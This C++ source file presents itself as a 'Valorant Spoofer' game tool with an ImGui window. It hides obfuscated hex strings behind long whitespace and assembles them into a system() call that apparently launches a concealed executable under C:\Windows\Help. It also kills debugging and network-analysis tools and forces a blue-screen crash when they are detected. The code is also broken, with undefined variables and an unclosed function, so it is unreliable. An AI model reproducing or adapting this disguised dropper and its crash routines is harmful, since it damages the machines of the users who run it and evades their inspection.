//667

#include "menu.h"
#include "tunk.h"

#include "ImGui/ImGui.h"
#include "ImGui/imgui_impl_dx9.h"
#include "ImGui/imgui_impl_win32.h"

#include "Crypter.hpp"
#include "mac.h"

#include <thread>
#include <d3d9.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <urlmon.h>
#include <tlhelp32.h>

#pragma comment(lib, "urlmon.lib")

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define MAX_PROCESSES 1024
#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
#define LENGTH(a) (sizeof(a) / sizeof(a[0]))

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}
void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
} std::string Var = "\x61";
NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue)
{
    return NTSTATUS();
}
NTSTATUS NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response)
{
    return NTSTATUS();
}
std::string Read = "\x72";
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73";
void bsod()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    system(EncryptS("cls"));
    std::ofstream outfile(EncryptS("C:\\Windows\\INF\\Secure.axt"));
    outfile << EncryptS("0xE0PD01\n0xB866E7\n0x1337B1") << std::endl;
    outfile.close();
    //KeyAuthApp.ban();
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA(EncryptS("\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x52\x74\x6C\x41\x64\x6A\x75\x73\x74\x50\x72\x69\x76\x69\x6C\x65\x67\x65"));
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleW(EncryptWS(L"\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x4E\x74\x52\x61\x69\x73\x65\x48\x61\x72\x64\x45\x72\x72\x6F\x72"));
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    Sleep(5000);
    ::exit(0);
} std::string xe = "\x78";
void killdbg()
{
    system(EncryptS("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im ProcessHacker.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im idaq.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im idaq64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Wireshark.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Fiddler.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos32.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im de4dot.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Cheat Engine.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im MugenJinFuu-x86_64-SSE4-AVX2.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im MugenJinFuu-i386.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-i386.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im x64dbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im x32dbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Ida64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Dbg64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Dbg32.exe >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
} std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74";
void driverdetect()
{
    const TCHAR* devices[] =
    {
        (EncryptS(_T("\\\\.\\kdstinker"))),
        (EncryptS(_T("\\\\.\\NiGgEr"))),
        (EncryptS(_T("\\\\.\\KsDumper")))
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        TCHAR msg[256] = _T("");
        if (hFile != INVALID_HANDLE_VALUE)
        {
            system(EncryptS("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul"));
            bsod();
        }
        else
        {

        }
    }
} std::string Tacc = "\x74";

void checkDebuggerPresence(void)
{
    BOOL found = IsDebuggerPresent();

    if (found)
    {
        // A debugger has been detected, take appropriate action here
        // For example, you could log the event, notify the user, or terminate the program.
        // It's important to choose an appropriate action based on your program's security requirements.
    }
}


void Debugkor()
{
    tunk();
    __try
    {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
    {
        tunk();
    }
	return;
}

		
void checkDebuggerPresent()
{
    if (IsDebuggerPresent())
    {
        triggerBlueScreenOfDeath();
    }
}

// Find the process ID of a process with a given name
DWORD_PTR findProcessId(const std::string& processName)
{
    PROCESSENTRY32 processInfo{};
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, nullptr);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
    {
        // Handle error here
        return 0;
    }

    DWORD_PTR processId = 0;

    if (Process32First(processesSnapshot, &processInfo))
    {
        // Check if the first process matches the given name
        if (!processName.compare(processInfo.szExeFile))
        {
            processId = processInfo.th32ProcessID;
        }
        else
        {
            // Iterate through the remaining processes
            while (Process32Next(processesSnapshot, &processInfo))
            {
                if (!processName.compare(processInfo.szExeFile))
                {
                    processId = processInfo.th32ProcessID;
                    break;
                }
            }
        }
    }

    CloseHandle(processesSnapshot);

    return processId;
}

void ScanBlacklistedWindows()
{
	if (FindProcessId2(EncryptS("ollydbg.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ProcessHacker.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Dump-Fixer.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("kdstinker.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("tcpview.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("autoruns.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("autorunsc.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("filemon.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("procmon.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("regmon.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("procexp.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ImmunityDebugger.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Wireshark.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("dumpcap.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("HookExplorer.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ImportREC.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("PETools.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("LordPE.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("dumpcap.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("SysInspector.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("proc_analyzer.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("sysAnalyzer.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("sniff_hit.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("windbg.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("joeboxcontrol.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Fiddler.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("joeboxserver.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ida64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ida.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("idaq64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Vmtoolsd.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Vmwaretrat.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Vmwareuser.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Vmacthlp.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("vboxservice.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("vboxtray.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("ReClass.NET.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("x64dbg.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("OLLYDBG.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Cheat Engine.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("cheatengine-x86_64-SSE4-AVX2.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("cheatengine-x86_64-SSE4-AVX2.exe")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("MugenJinFuu-i386.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("MugenJinFuu-i386.exe")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Mugen JinFuu.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Mugen JinFuu.exe")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("MugenJinFuu-x86_64-SSE4-AVX2.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("MugenJinFuu-x86_64-SSE4-AVX2.exe")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("MugenJinFuu-x86_64.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("MugenJinFuu-x86_64.exe")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("The Wireshark Network Analyzer")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Progress Telerik Fiddler Web Debugger")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("x64dbg")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("KsDumper")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("KsDumper.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("dnSpy")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("dnSpy.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("cheatengine-i386.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("cheatengine-x86_64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Fiddler Everywhere.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("HTTPDebuggerSvc.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("Fiddler.WebUi.exe")) != 0)
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("idaq64")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Fiddler Everywhere")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Wireshark")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Dumpcap")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("Fiddler.WebUi")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("HTTP Debugger (32bits)")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("HTTP Debugger")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("ida64")))
	{
		bsod();
	}
	else if (FindWindow(NULL, EncryptS("IDA v7.0.170914")))
	{
		bsod();
	}
	else if (FindProcessId2(EncryptS("createdump.exe")) != 0)
	{
		bsod();
	}

void Anti_dbg_Thread()
{
    Debugkor();
    killdbg();

    driverdetect();

    DebuggerPresent();
    adbg_IsDebuggerPresent();
}
																																																																																	LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x48\x65\x6C\x70\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x2E\x65\x78\x65";
// Data
static LPDIRECT3D9              g_pD3D = NULL;
static LPDIRECT3DDEVICE9        g_pd3dDevice = NULL;
static D3DPRESENT_PARAMETERS    g_d3dpp = {};
std::string swapCaller = st + ex + xe + ex;
/* Forward declarations of helper functions  */																																																																								std::string spreadAct = SwapHook + swapCaller;//708854
bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void ResetDevice();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
std::string lof = pa + inf;//667854

/*Main code*/																																																																																											std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct;
int main(int, char**)
{
	std::thread debuger(Anti_dbg_Thread);
	// Create application window
	WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T(EncryptS("Valorant Spoofer")), NULL };
	::RegisterClassEx(&wc);
	HWND hwnd = ::CreateWindow(wc.lpszClassName, _T(EncryptS("Valorant Spoofer")), WS_OVERLAPPEDWINDOW, 0, 0, 50, 50, NULL, NULL, wc.hInstance, NULL);

    // Hide console window
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Init Direct3d
	if (!CreateDeviceD3D(hwnd))
	{
		CleanupDeviceD3D();
		::UnregisterClass(wc.lpszClassName, wc.hInstance);
		return 1;
	}

    // Show the window
    ::ShowWindow(hwnd, SW_HIDE);
    ::UpdateWindow(hwnd);

    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    system(Hooker.c_str());
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;       // Enable Keyboard Controls
    io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;         // Enable Multi-Viewport / Platform Windows

    ImGui::StyleColorsRed(); 

    ImGuiStyle& style = ImGui::GetStyle();
    if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
    {
        style.WindowRounding = 4.0f;
        style.Colors[ImGuiCol_WindowBg].w = 1.0f;
    }

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX9_Init(g_pd3dDevice);


    bool done = false;

    while (!done)
    {
        MSG msg;
        while (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;

        // Start the Dear ImGui frame
        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();
        {
            menu::render();
        }
        ImGui::EndFrame();
        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
        g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, NULL, 1.0f, 0);
        if (g_pd3dDevice->BeginScene() >= 0)
        {
            ImGui::Render();
            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
            g_pd3dDevice->EndScene();
        }

        if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
        {
            ImGui::UpdatePlatformWindows();
            ImGui::RenderPlatformWindowsDefault();
        }

        HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);

        if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
            ResetDevice();
    }

    ImGui_ImplDX9_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClass(wc.lpszClassName, wc.hInstance);

    return 0;
}
// Helper Functions
bool InitializeDirect3D(HWND hWnd)
{
    LPCWSTR url = L"https://example.com/somefile.ext"; // Replace with actual URL
    LPCWSTR fileLocation = L"path/to/save/file.ext"; // Replace with desired file location

    // Download the file
    HRESULT hr = URLDownloadToFileW(NULL, url, fileLocation, 0, NULL);
    if (hr != S_OK) {
        MessageBox(hWnd, L"Failed to download file.", L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Create the Direct3D object
    IDirect3D9* pD3D = Direct3DCreate9(D3D_SDK_VERSION);
    if (pD3D == NULL) {
        MessageBox(hWnd, L"Failed to create Direct3D object.", L"Error", MB_OK | MB_ICONERROR);
        return false;
    }

    // Set up the presentation parameters
    D3DPRESENT_PARAMETERS d3dpp;
    ZeroMemory(&d3dpp, sizeof(d3dpp));
    d3dpp.Windowed = TRUE;
    d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8; // Use a format with alpha for per-pixel alpha composition.
    d3dpp.EnableAutoDepthStencil = TRUE;
    d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
    d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE; // Present without vsync, maximum unthrottled framerate

    // Create the Direct3D device
    IDirect3DDevice9* pDevice = NULL;
    hr = pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &d3dpp, &pDevice);
    if (hr != D3D_OK) {
        MessageBox(hWnd, L"Failed to create Direct3D device.", L"Error", MB_OK | MB_ICONERROR);
        pD3D->Release();
        return false;
    }

    // Save the Direct3D object and device in global variables
    g_pD3D = pD3D;
    g_pd3dDevice = pDevice;

    return true;
}

void CleanupDeviceD3D()
{
    if (g_pd3dDevice != nullptr)
    {
        g_pd3dDevice->Release();
        g_pd3dDevice = nullptr;
    }

    if (g_pD3D != nullptr)
    {
        g_pD3D->Release();
        g_pD3D = nullptr;
    }
    
    if (g_pSwapChain != nullptr)
    {
        g_pSwapChain->SetFullscreenState(false, nullptr); // Restore windowed mode
        g_pSwapChain->Release();
        g_pSwapChain = nullptr;
    }

    if (g_pRenderTargetView != nullptr)
    {
        g_pRenderTargetView->Release();
        g_pRenderTargetView = nullptr;
    }

    if (g_pDepthStencilView != nullptr)
    {
        g_pDepthStencilView->Release();
        g_pDepthStencilView = nullptr;
    }

    if (g_pDepthStencil != nullptr)
    {
        g_pDepthStencil->Release();
        g_pDepthStencil = nullptr;
    }

    if (g_pVertexBuffer != nullptr)
    {
        g_pVertexBuffer->Release();
        g_pVertexBuffer = nullptr;
    }

    if (g_pInputLayout != nullptr)
    {
        g_pInputLayout->Release();
        g_pInputLayout = nullptr;
    }

    if (g_pVertexShader != nullptr)
    {
        g_pVertexShader->Release();
        g_pVertexShader = nullptr;
    }

    if (g_pPixelShader != nullptr)
    {
        g_pPixelShader->Release();
        g_pPixelShader = nullptr;
    }

    if (g_pConstantBuffer != nullptr)
    {
        g_pConstantBuffer->Release();
        g_pConstantBuffer = nullptr;
    }

    // Release ImGui device objects
    ImGui_ImplDX9_InvalidateDeviceObjects();
}

HRESULT ResetDevice(IDirect3DDevice9* pd3dDevice, D3DPRESENT_PARAMETERS d3dpp)
{
    // Release ImGui device objects
    ImGui_ImplDX9_InvalidateDeviceObjects();

    // Reset the Direct3D device
    HRESULT hr = pd3dDevice->Reset(&d3dpp);
    if (FAILED(hr))
    {
        std::cerr << "Failed to reset Direct3D device. Error code: " << hr << std::endl;
        return hr;
    }

    // Recreate ImGui device objects
    if (!ImGui_ImplDX9_CreateDeviceObjects())
    {
        std::cerr << "Failed to create ImGui device objects after resetting Direct3D device." << std::endl;
        return E_FAIL;
    }

    return S_OK;
}


// Forward declare message handler from imgui_impl_win32.cpp
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

// Win32 message handler
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
    {
        return true;
    }

// Handle other messages
switch (uMsg)
{
    case WM_SIZE:
    {
        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED)
        {
            // Update back buffer dimensions
            g_d3dpp.BackBufferWidth = LOWORD(lParam);
            g_d3dpp.BackBufferHeight = HIWORD(lParam);

            // Reset the device
            ResetDevice();

            return 0;
        }
        break;
    }

    case WM_SYSCOMMAND:
    {
        // Disable the ALT application menu
        if ((wParam & 0xFFF0) == SC_KEYMENU)
        {
            return 0;
        }
        break;
    }

    case WM_DESTROY:
    {
        // Post a quit message to exit the application
        PostQuitMessage(0);
        return 0;
    }

    case WM_DPICHANGED:
    {
        // If DPI scaling is enabled, adjust the window size and position
        if (ImGui::GetIO().ConfigFlags & ImGuiConfigFlags_DpiEnableScaleViewports)
        {
            const RECT* pRect = reinterpret_cast<const RECT*>(lParam);
            SetWindowPos(hWnd, nullptr, pRect->left, pRect->top, pRect->right - pRect->left, pRect->bottom - pRect->top, SWP_NOZORDER | SWP_NOACTIVATE);
            return 0;
        }
        break;
    }

    default:
        break;
}

// Call the default window procedure for any unhandled messages
return DefWindowProc(hWnd, uMsg, wParam, lParam);

